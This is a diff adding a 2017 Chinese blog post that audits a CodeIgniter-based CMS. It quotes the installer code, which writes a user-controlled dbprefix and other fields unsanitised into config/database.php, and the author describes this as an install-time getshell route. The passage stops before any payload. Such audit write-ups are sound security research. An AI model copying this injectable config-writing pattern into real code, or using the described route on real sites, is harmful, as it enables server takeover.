@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="倾旋的博客" property="og:site_name">
+
+  <meta content="记一次某Cms的审计" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="本文简述一下对一个采用了开源框架的cms的审计过程。" property="og:description">
+
+
+  <meta content="http://localhost:4000/archivers/2017-08-18/1" property="og:url">
+
+
+  <meta content="2017-08-18T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="代码审计" property="article:section">
+  
+
+
+  
+
+  <title>记一次某Cms的审计</title>
+  <meta name="description" content="本文简述一下对一个采用了开源框架的cms的审计过程。">
+<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
+  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2017-08-18/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">倾旋的博客</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/about/">关于我</a></li>
+
+        
+
+        
+        
+        <li><a href="/category/">Category</a></li>
+
+        
+
+        
+        
+        <li><a href="/contact/">Contact</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/other/">其他信息</a></li>
+
+        
+
+        
+        
+        <li><a href="/tools/socat">socat 使用手册</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">记一次某Cms的审计</h1>
+      <p class="post-meta"><time datetime="2017-08-18T00:00:00+08:00" itemprop="datePublished">Aug 18, 2017</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>本文简述一下对一个采用了开源框架的cms的审计过程。
+<!--more--></p>
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>此套cms采用了CI框架，之前在做漏洞平台的时候也是用的这个框架开发。</p>
+
+<p>CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。</p>
+
+<p>文章写的比较急，以后再补充……</p>
+
+<h2 id="0x01-第一弹-安装程序getshell">0x01 第一弹 安装程序Getshell</h2>
+
+<p>首先我们一般都是在安装的时候，看看有没有重装的可能性，粗略的看了一下代码并没有，但是存在一个有趣的安装getshell问题。</p>
+
+<p>CI框架的数据库配置在：<code class="highlighter-rouge">config\database.php</code>,其常见内容如下：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="s1">'BASEPATH'</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>
+
+<span class="nv">$active_group</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
+<span class="nv">$query_builder</span>  <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
+
+<span class="nv">$db</span><span class="p">[</span><span class="s1">'default'</span><span class="p">]</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+  <span class="s1">'dsn'</span>   <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
+  <span class="s1">'hostname'</span>  <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
+  <span class="s1">'username'</span>  <span class="o">=&gt;</span> <span class="s1">'root'</span><span class="p">,</span>
+  <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="s1">'root'</span><span class="p">,</span>
+  <span class="s1">'port'</span>    <span class="o">=&gt;</span> <span class="s1">'3306'</span><span class="p">,</span>
+  <span class="s1">'database'</span>  <span class="o">=&gt;</span> <span class="s1">'xxxxx'</span><span class="p">,</span>
+  <span class="s1">'dbdriver'</span>  <span class="o">=&gt;</span> <span class="s1">'mysqli'</span><span class="p">,</span>
+  <span class="s1">'dbprefix'</span>  <span class="o">=&gt;</span> <span class="s1">'dr_'</span><span class="p">,</span>
+  <span class="s1">'pconnect'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
+  <span class="s1">'db_debug'</span>  <span class="o">=&gt;</span> <span class="kc">true</span><span class="p">,</span>
+  <span class="s1">'cache_on'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
+  <span class="s1">'cachedir'</span>  <span class="o">=&gt;</span> <span class="s1">'cache/sql/'</span><span class="p">,</span>
+  <span class="s1">'char_set'</span>  <span class="o">=&gt;</span> <span class="s1">'utf8'</span><span class="p">,</span>
+  <span class="s1">'dbcollat'</span>  <span class="o">=&gt;</span> <span class="s1">'utf8_general_ci'</span><span class="p">,</span>
+  <span class="s1">'swap_pre'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
+  <span class="s1">'autoinit'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
+  <span class="s1">'encrypt'</span> <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
+  <span class="s1">'compress'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
+  <span class="s1">'stricton'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
+  <span class="s1">'failover'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(),</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>安装界面：
+<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x00.jpg" alt="Install" /></p>
+
+<p>然后找到这个界面对应的代码 <code class="highlighter-rouge">diy\dayrui\controllers\Install.php</code>：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="sd">/**
+     * 安装程序
+     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span> <span class="p">{</span>
+
+        <span class="nv">$step</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'step'</span><span class="p">));</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="nv">$step</span><span class="p">)</span> <span class="p">{</span>
+
+            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+
+                <span class="nv">$check_pass</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+
+                <span class="nv">$writeAble</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_checkFileRight</span><span class="p">();</span>
+                <span class="nv">$lowestEnvironment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getLowestEnvironment</span><span class="p">();</span>
+                <span class="nv">$currentEnvironment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getCurrentEnvironment</span><span class="p">();</span>
+                <span class="nv">$recommendEnvironment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getRecommendEnvironment</span><span class="p">();</span>
+
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$currentEnvironment</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'_ischeck'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="kc">false</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$check_pass</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$writeAble</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$check_pass</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+                    <span class="s1">'writeAble'</span> <span class="o">=&gt;</span> <span class="nv">$writeAble</span><span class="p">,</span>
+                    <span class="s1">'check_pass'</span> <span class="o">=&gt;</span> <span class="nv">$check_pass</span><span class="p">,</span>
+                    <span class="s1">'lowestEnvironment'</span> <span class="o">=&gt;</span> <span class="nv">$lowestEnvironment</span><span class="p">,</span>
+                    <span class="s1">'currentEnvironment'</span> <span class="o">=&gt;</span> <span class="nv">$currentEnvironment</span><span class="p">,</span>
+                    <span class="s1">'recommendEnvironment'</span> <span class="o">=&gt;</span> <span class="nv">$recommendEnvironment</span><span class="p">,</span>
+                <span class="p">));</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span>
+                    <span class="c1">// 数据库支持判断</span>
+                    <span class="nv">$mysqli</span> <span class="o">=</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mysqli_init'</span><span class="p">)</span> <span class="o">?</span> <span class="nx">mysqli_init</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">'5.5.0'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$mysqli</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'您的PHP环境必须启用Mysqli扩展'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="c1">// 参数判断</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^[\x7f-\xff\dA-Za-z\.\_]+$/'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]))</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'管理员账号格式不正确'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'管理员密码不能为空'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">])</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库名称不能为空'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库名称不能是数字'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">],</span> <span class="s1">'.'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库名称不能存在.号'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">helper</span><span class="p">(</span><span class="s1">'email'</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="nx">valid_email</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'Email格式不正确'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">mysqli_real_connect</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]))</span> <span class="p">{</span>
+                            <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'[mysqli_real_connect] 无法连接到数据库服务器（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]</span><span class="o">.</span><span class="s1">'），请检查用户名（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）和密码（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）是否正确'</span><span class="p">));</span>
+                        <span class="p">}</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">mysqli_select_db</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="s1">'CREATE DATABASE '</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
+                                <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'指定的数据库（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）不存在，系统尝试创建失败，请通过其他方式建立数据库'</span><span class="p">));</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                        <span class="c1">// utf8方式打开数据库</span>
+                        <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="s1">'SET NAMES utf8'</span><span class="p">);</span>
+                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]))</span> <span class="p">{</span>
+                            <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">'&lt;br&gt;无法连接到数据库服务器（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]</span><span class="o">.</span><span class="s1">'），请检查用户名（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）和密码（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）是否正确'</span><span class="p">));</span>
+                        <span class="p">}</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'CREATE DATABASE '</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
+                                <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">'&lt;br&gt;指定的数据库（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）不存在，系统尝试创建失败，请通过其他方式建立数据库'</span><span class="p">));</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                        <span class="c1">// utf8方式打开数据库</span>
+                        <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'SET NAMES utf8'</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="c1">// 格式化端口</span>
+                    <span class="k">list</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">])</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]);</span>
+                    <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span> <span class="o">?</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span> <span class="o">:</span> <span class="mi">3306</span><span class="p">;</span>
+                    <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'dr_'</span><span class="p">;</span> <span class="c1">// 这个变量可控</span>
+                    <span class="c1">// 配置文件</span>
+                    <span class="nv">$config</span> <span class="o">=</span> <span class="s2">"&lt;?php"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"if (!defined('BASEPATH')) exit('No direct script access allowed');"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">active_group = 'default';"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">query_builder  = TRUE;"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">db['default']  = array("</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dsn'   =&gt; '',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'hostname'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'username'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'password'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'port'    =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'database'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dbdriver'  =&gt; '"</span><span class="o">.</span><span class="p">(</span><span class="nv">$mysqli</span> <span class="o">?</span> <span class="s1">'mysqli'</span> <span class="o">:</span> <span class="s1">'mysql'</span><span class="p">)</span><span class="o">.</span><span class="s2">"',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dbprefix'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'pconnect'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'db_debug'  =&gt; true,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'cache_on'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'cachedir'  =&gt; 'cache/sql/',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'char_set'  =&gt; 'utf8',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dbcollat'  =&gt; 'utf8_general_ci',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'swap_pre'  =&gt; '',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'autoinit'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'encrypt' =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'compress'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'stricton'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'failover'  =&gt; array(),"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">");"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+                    <span class="c1">// 保存配置文件</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/database.php'</span><span class="p">,</span> <span class="nv">$config</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库配置文件保存失败，请检查文件config/database.php权限！'</span><span class="p">));</span>
+                    <span class="p">}</span>
+                    <span class="c1">// 加载数据库</span>
